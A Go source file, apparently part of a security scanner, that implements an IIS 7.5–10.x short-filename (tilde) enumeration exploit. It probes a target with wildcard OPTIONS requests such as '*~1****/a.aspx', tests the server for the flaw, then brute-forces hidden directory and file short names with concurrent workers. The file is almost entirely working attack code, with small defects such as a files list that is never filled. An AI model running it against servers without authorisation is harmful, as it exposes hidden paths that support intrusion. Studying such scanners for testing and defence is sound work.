package iis

import (
	"fmt"
	"github.com/yhy0/Jie/pkg/protocols/httpx"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

/**
   @author yhy
   @since 2023/9/11
   @desc iis高版本短文件名猜解脚本，适用于iis7.5~10.x版本的iis中间件。
	https://github.com/abc123info/iis7.5-10.x-ShortNameFuzz
**/

type Scanner struct {
	target    *url.URL
	payloads  []string
	files     []string
	dirs      []string
	queue     chan string
	lock      sync.Mutex
	waitGroup sync.WaitGroup
}

func NewScanner(target string) (*Scanner, error) {
	u, err := url.Parse(target)
	if err != nil {
		return nil, err
	}
	if u.Path[len(u.Path)-1:] != "/" {
		u.Path += "/"
	}
	payloads := strings.Split("abcdefghijklmnopqrstuvwxyz0123456789_-", "")
	return &Scanner{
		target:   u,
		payloads: payloads,
		queue:    make(chan string, 100),
	}, nil
}

func (s *Scanner) getStatus(path string) int {
	u := *s.target
	u.Path += path
	for i := 0; i < 3; i++ {
		resp, err := httpx.Request(u.String(), "OPTIONS", "", false, nil)
		if err != nil {
			continue
		}
		return resp.StatusCode
	}
	return 0
}

func (s *Scanner) IsVul() bool {
	status1 := s.getStatus("*~1****/a.aspx")
	status2 := s.getStatus("/l1j1e*~1****/a.aspx")
	return status1 == 404 && status2 == 200
}

func (s *Scanner) Run() {
	for _, payload := range s.payloads {
		s.queue <- s.target.Path + payload
	}
	for i := 0; i < 10; i++ {
		s.waitGroup.Add(1)
		go s.scanWorker()
	}
	s.waitGroup.Wait()
}

func (s *Scanner) Report() {
	fmt.Println(strings.Repeat("-", 64))
	for _, d := range s.dirs {
		fmt.Println("Dir: ", d)
	}
	for _, f := range s.files {
		fmt.Println("File:", f)
	}
	fmt.Println(strings.Repeat("-", 64))
	fmt.Printf("%d Directories, %d Files found in total\n", len(s.dirs), len(s.files))
}

func (s *Scanner) print(msg string) {
	s.lock.Lock()
	defer s.lock.Unlock()
	fmt.Println(msg)
}

func (s *Scanner) scanWorker() {
	defer s.waitGroup.Done()
	for {
		select {
		case path, ok := <-s.queue:
			if !ok {
				return
			}
			status := s.getStatus(path + "*~1****/1.aspx")
			if status == 404 {
				s.print("Found " + path + "****" + "\t[scan in progress]")
				if len(path)-len(s.target.Path) < 6 {
					for _, payload := range s.payloads {
						s.queue <- path + payload
					}
				} else {
					s.dirs = append(s.dirs, path+"~1")
					s.print("Found Dir " + path + "~1\t[Done]")
				}
			}
		case <-time.After(6 * time.Second):
			return
		}
	}
}

func main() {
	if len(os.Args) == 1 {
		fmt.Printf("Usage: %s target\n", os.Args[0])
		os.Exit(0)
	}

	target := os.Args[1]
	s, err := NewScanner(target)
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(1)
	}

	if !s.IsVul() {
		fmt.Println("Sorry, server is not vulnerable")
		os.Exit(0)
	}

	fmt.Println("Server is vulnerable, please wait, scanning...")
	s.Run()
	s.Report()
}
